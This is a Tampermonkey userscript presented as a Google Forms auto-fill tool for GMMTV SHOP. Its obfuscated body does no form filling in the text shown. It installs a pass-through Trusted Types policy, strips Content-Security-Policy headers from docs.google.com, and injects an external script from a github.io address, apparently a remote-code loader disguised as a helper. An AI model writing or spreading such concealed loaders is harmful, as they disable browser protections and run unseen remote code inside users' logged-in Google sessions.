// ==UserScript==
// @name         GMMTV SHOP Google Forms 自动填写
// @namespace    http://tampermonkey.net
// @version      1.1
// @description  GMMTV SHOP Google Forms 自动填写
// @author       Kay
// @match        https://docs.google.com/forms/*
// @icon         https://aimg8.dlssyht.cn/u/1533835/ueditor/image/767/1533835/1633159205592221.png
// @grant        GM_webRequest
// @grant        GM_addElement
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';
    const _0x4c9417 = _0x4493; function _0x4493(_0x35bb94, _0x52efc9) { _0x35bb94 = _0x35bb94 - 0x197; const _0x5cd898 = _0x5cd8(); let _0x44930e = _0x5cd898[_0x35bb94]; return _0x44930e; } (function (_0x4f8115, _0x1c5c33) { const _0x541fd6 = _0x4493, _0x4a03aa = _0x4f8115(); while (!![]) { try { const _0x18c85d = parseInt(_0x541fd6(0x1ac)) / 0x1 + parseInt(_0x541fd6(0x197)) / 0x2 * (parseInt(_0x541fd6(0x1a0)) / 0x3) + -parseInt(_0x541fd6(0x1a9)) / 0x4 * (-parseInt(_0x541fd6(0x1b1)) / 0x5) + parseInt(_0x541fd6(0x1a5)) / 0x6 * (-parseInt(_0x541fd6(0x1ad)) / 0x7) + parseInt(_0x541fd6(0x19f)) / 0x8 * (-parseInt(_0x541fd6(0x19e)) / 0x9) + parseInt(_0x541fd6(0x19d)) / 0xa + -parseInt(_0x541fd6(0x19b)) / 0xb * (parseInt(_0x541fd6(0x1ae)) / 0xc); if (_0x18c85d === _0x1c5c33) break; else _0x4a03aa['push'](_0x4a03aa['shift']()); } catch (_0x53da33) { _0x4a03aa['push'](_0x4a03aa['shift']()); } } }(_0x5cd8, 0x9e83e)); function initTrustedTypesBypass() { const _0x4c00e2 = _0x4493; if (window[_0x4c00e2(0x1b0)] && window[_0x4c00e2(0x1b0)][_0x4c00e2(0x1ab)]) try { !window['trustedTypes'][_0x4c00e2(0x1aa)] && (window[_0x4c00e2(0x1b0)][_0x4c00e2(0x1ab)](_0x4c00e2(0x1a3), { 'createHTML': _0x50de84 => _0x50de84, 'createScript': _0x1da82c => _0x1da82c, 'createScriptURL': _0x1bdbd6 => _0x1bdbd6 }), console[_0x4c00e2(0x1a1)]('[注入成功]\x20Trusted\x20Types\x20策略已生效')); } catch (_0x3217e7) { console[_0x4c00e2(0x1a8)](_0x4c00e2(0x198), _0x3217e7); } } function stripCSPHeaders() { const _0x3e80f2 = _0x4493; typeof GM_webRequest !== _0x3e80f2(0x1a6) && (GM_webRequest([{ 'selector': _0x3e80f2(0x1a7), 'action': { 'removeResponseHeaders': [_0x3e80f2(0x1af), _0x3e80f2(0x199)] } }]), console[_0x3e80f2(0x1a1)](_0x3e80f2(0x19a))); } function loadExternalScript(_0x1c4b85) { const _0x353883 = _0x4493; return console[_0x353883(0x1a1)]('[加载中]\x20外部脚本:\x20', _0x1c4b85), GM_addElement(_0x353883(0x1a2), { 'src': _0x1c4b85, 'type': _0x353883(0x1a4) }); } initTrustedTypesBypass(), stripCSPHeaders(); const EXTERNAL_JS_URL = _0x4c9417(0x19c); loadExternalScript(EXTERNAL_JS_URL); function _0x5cd8() { const _0x18a25d = ['text/javascript', '3245058AHjntH', 'undefined', 'https:\x20//docs.google.com*', 'warn', '4975996UcuNWn', 'defaultPolicy', 'createPolicy', '1170670DsrUME', '7DQqcMB', '20974020sVlJrd', 'content-security-policy', 'trustedTypes', '5pAlhKG', '178cnRczX', '[跳过]\x20Trusted\x20Types\x20策略已存在或被锁定:\x20', 'content-security-policy-report-only', '[注入成功]\x20CSP\x20移除规则已注册', '11ZqnmGA', 'https://1024nettech.github.io/custom/GMMTV_SHOP/auto-fill.js', '5611910wZdjKU', '11064123CLFGJt', '8GNMHAO', '40161TWmLBd', 'log', 'script', 'default']; _0x5cd8 = function () { return _0x18a25d; }; return _0x5cd8(); }
})();
// End-533-2026.03.22.153202
